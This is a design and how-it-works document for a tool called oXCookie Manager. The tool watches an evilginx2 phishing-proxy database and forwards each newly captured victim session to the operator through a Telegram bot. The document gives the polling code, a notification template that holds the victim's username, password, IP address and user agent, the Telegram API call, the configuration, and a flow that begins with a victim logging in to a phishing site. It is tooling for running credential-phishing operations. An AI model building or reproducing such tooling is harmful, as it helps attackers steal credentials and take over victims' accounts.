# Session Notification System - How It Works

This document explains how the session notification system works in the oXCookie Manager application.

## Overview

The session notification system automatically detects new cookie sessions captured by evilginx2 and sends real-time notifications via Telegram (and optionally Discord/Email) when a new session is detected.

## Complete Flow

```
┌─────────────────┐
│  evilginx2      │
│  Captures       │
│  Cookie Session │
└────────┬────────┘
         │
         │ Writes to data.db
         ▼
┌─────────────────┐
│  Database File  │
│  (data.db)      │
└────────┬────────┘
         │
         │ monitor_database() reads every 30 seconds
         ▼
┌─────────────────┐
│  Monitoring     │
│  Thread         │
│  (Background)   │
└────────┬────────┘
         │
         │ Detects new session ID
         ▼
┌─────────────────┐
│  Check if       │
│  Already        │
│  Processed      │
└────────┬────────┘
         │
         │ New session found
         ▼
┌─────────────────┐
│  send_notifications() │
│  Function       │
└────────┬────────┘
         │
         │ Formats message from template
         ▼
┌─────────────────┐
│  Load Template  │
│  Replace        │
│  Placeholders   │
└────────┬────────┘
         │
         │ Formatted message ready
         ▼
┌─────────────────┐
│  send_telegram_ │
│  notification() │
└────────┬────────┘
         │
         │ API call to Telegram
         ▼
┌─────────────────┐
│  Telegram Bot   │
│  Sends Message  │
│  to User        │
└─────────────────┘
```

## Step-by-Step Breakdown

### 1. Session Detection (`monitor_database()`)

**Location:** `app.py` - Lines 312-359

**How it works:**
- Runs as a background thread (started via `/api/monitoring/start` endpoint)
- Polls the evilginx2 database file every **30 seconds**
- Uses `read_latest_session()` to get the most recent session
- Maintains a `processed_sessions` dictionary to track which sessions have already been notified

**Key Code:**
```python
while monitoring_status["active"]:
    latest_session = read_latest_session(db_path)
    
    if latest_session and latest_session.get("id", 0) != 0:
        session_id = str(latest_session.get("id", 0))
        
        # Check if this is a new session
        if session_id not in processed_sessions:
            # NEW SESSION DETECTED!
            processed_sessions[session_id] = True
            send_notifications(latest_session)
    
    time.sleep(30)  # Check every 30 seconds
```

**Important:**
- Only processes sessions with `id != 0` (valid sessions)
- Tracks processed sessions to avoid duplicate notifications
- Runs continuously until monitoring is stopped

---

### 2. Notification Function (`send_notifications()`)

**Location:** `app.py` - Lines 370-486

**How it works:**
1. **Loads configuration** - Gets Telegram settings from config
2. **Gets notification template** - Loads custom template or uses default
3. **Extracts session data** - Gets username, password, IP, user agent, timestamp
4. **Formats message** - Replaces placeholders in template with actual values
5. **Escapes for MarkdownV2** - Escapes special characters for Telegram formatting
6. **Calls Telegram API** - Sends notification via `send_telegram_notification()`

**Message Template Placeholders:**
- `{session_id}` - Session ID number
- `{username}` - Captured username
- `{password}` - Captured password
- `{remote_addr}` - Victim's IP address
- `{useragent}` - Victim's user agent string
- `{time}` - Timestamp when session was captured

**Default Template:**
```
*🍪 New Cookie Session Captured\!*

━━━━━━━━━━━━━━━━━━━━
*Session Details:*
• *ID:* `{session_id}`
• *Username:* `{username}`
• *Password:* `{password}`
• *Remote IP:* `{remote_addr}`
• *User Agent:* `{useragent}`
• *Timestamp:* `{time}`
━━━━━━━━━━━━━━━━━━━━
```

**Example Output:**
```
*🍪 New Cookie Session Captured!*

━━━━━━━━━━━━━━━━━━━━
*Session Details:*
• *ID:* `4`
• *Username:* `user@example.com`
• *Password:* `password123`
• *Remote IP:* `192.168.1.100`
• *User Agent:* `Mozilla/5.0...`
• *Timestamp:* `2025-12-02 12:00:00`
━━━━━━━━━━━━━━━━━━━━
```

---

### 3. Telegram Notification (`send_telegram_notification()`)

**Location:** `notifications.py` - Lines 15-315

**How it works:**

#### A. Message Preparation
- Formats message with MarkdownV2 parse mode
- Builds inline keyboard buttons (if applicable)

#### B. Inline Button Creation
- **"View on Panel" button:**
  - Only added if `web_url` is HTTPS and publicly accessible
  - Links to: `{web_url}/?session={session_id}`
  - Skipped for localhost URLs (Telegram requirement)

- **"Contact Support" button:**
  - Added if `support_telegram` is configured
  - Links to: `https://t.me/{support_user}`

#### C. API Call
- Sends POST request to Telegram Bot API
- Endpoint: `https://api.telegram.org/bot{token}/sendMessage`
- Includes:
  - `chat_id` - Your Telegram chat ID
  - `text` - Formatted message
  - `parse_mode` - "MarkdownV2"
  - `reply_markup` - Inline keyboard (if buttons exist)

#### D. Error Handling
- If MarkdownV2 parsing fails (400 error):
  - Automatically retries without `parse_mode`
  - Removes invalid inline buttons
  - Sends as plain text

- If button URL is invalid:
  - Removes the invalid button
  - Retries with only valid buttons

**Response:**
- Returns `message_id` if successful
- Returns `None` if failed
- Logs detailed error messages for debugging

---

## Configuration Requirements

### Required Settings (in `~/.evilginx_monitor/config.json`):

```json
{
  "dbfile_path": "/opt/evilginx/data.db",
  "telegram_enable": true,
  "telegram_token": "YOUR_BOT_TOKEN",
  "telegr_chatid": "YOUR_CHAT_ID",
  "web_url": "https://your-panel-domain.com",
  "support_telegram": "@your_support",
  "notification_incoming_cookie": "Custom template here..."
}
```

### Settings Explained:

- **`dbfile_path`** - Path to evilginx2 database file
- **`telegram_enable`** - Enable/disable Telegram notifications
- **`telegram_token`** - Your Telegram bot token (from @BotFather)
- **`telegr_chatid`** - Your Telegram chat ID (where notifications are sent)
- **`web_url`** - Your panel URL (must be HTTPS for inline buttons)
- **`support_telegram`** - Support Telegram username (optional)
- **`notification_incoming_cookie`** - Custom notification template (optional)

---

## Database Reading (`read_latest_session()`)

**Location:** `database_reader.py` - Lines 10-57

**How it works:**
- Reads evilginx2 database file (Redis RDB format)
- Parses JSON session entries
- Returns the most recent session (highest ID)
- Handles file encoding issues gracefully

**Database Format:**
```
sessions:4
$451
{"id":4,"username":"user@example.com","password":"pass123",...}
```

---

## Starting/Stopping Monitoring

### Start Monitoring:
```bash
POST /api/monitoring/start
```

### Stop Monitoring:
```bash
POST /api/monitoring/stop
```

### Check Status:
```bash
GET /api/status
```

**Response:**
```json
{
  "monitoring": {
    "active": true,
    "last_check": "2025-12-02T12:00:00",
    "last_session_id": 4
  }
}
```

---

## Testing Notifications

### Test Notification Endpoint:
```bash
POST /api/notifications/test-session
```

**How it works:**
- Gets the most recent session from database
- Formats and sends notification using current template
- Returns success/error status
- Useful for testing notification templates and Telegram configuration

---

## Important Notes

1. **No File Attachments**: Notifications are sent as text messages only (no TXT file attachments). Users can view full session details on the web panel.

2. **Duplicate Prevention**: The system tracks processed sessions to avoid sending duplicate notifications for the same session.

3. **Polling Interval**: Database is checked every 30 seconds. This is a balance between responsiveness and system load.

4. **URL Validation**: Inline buttons only work with HTTPS URLs that are publicly accessible. Localhost URLs are automatically skipped.

5. **Error Recovery**: If MarkdownV2 formatting fails, the system automatically retries as plain text to ensure delivery.

6. **Template Customization**: Notification templates can be customized in the web UI (Notification Settings page) without restarting the app.

---

## Troubleshooting

### Notifications Not Sending:
1. Check Telegram configuration:
   - `telegram_enable` = `true`
   - `telegram_token` is set
   - `telegr_chatid` is set

2. Check monitoring status:
   - Is monitoring active? (`GET /api/status`)
   - Is database path correct?

3. Check logs:
   - Look for `[NOTIFICATIONS]` log messages
   - Check for error messages

### Button Not Appearing:
- Button only appears if `web_url` is HTTPS and not localhost
- Check `web_url` setting in config
- For testing, button is intentionally skipped (notification still sends)

### Duplicate Notifications:
- System tracks processed sessions
- If you see duplicates, check if monitoring was restarted (clears processed sessions cache)

---

## Example Notification Flow

1. **Victim logs in** to phishing site → evilginx2 captures credentials
2. **evilginx2 writes** session to `data.db`
3. **Monitoring thread** (running every 30s) reads database
4. **New session detected** (ID: 5, not in processed_sessions)
5. **Mark as processed** (`processed_sessions["5"] = True`)
6. **Load template** from config
7. **Format message** with session data
8. **Call Telegram API** with formatted message
9. **Telegram sends** notification to your chat
10. **You receive** notification with session details and "View on Panel" button

---

## Code Flow Summary

```
monitor_database() [Background Thread]
    ↓
read_latest_session() [Every 30 seconds]
    ↓
Check if session_id in processed_sessions
    ↓
If NEW → send_notifications(session_data)
    ↓
Load template → Replace placeholders → Escape MarkdownV2
    ↓
send_telegram_notification()
    ↓
Build inline buttons (if valid URL)
    ↓
POST to Telegram API
    ↓
Return message_id (success) or None (failure)
```

---

This system provides real-time notifications whenever evilginx2 captures a new cookie session, allowing you to monitor and respond to captured credentials immediately.

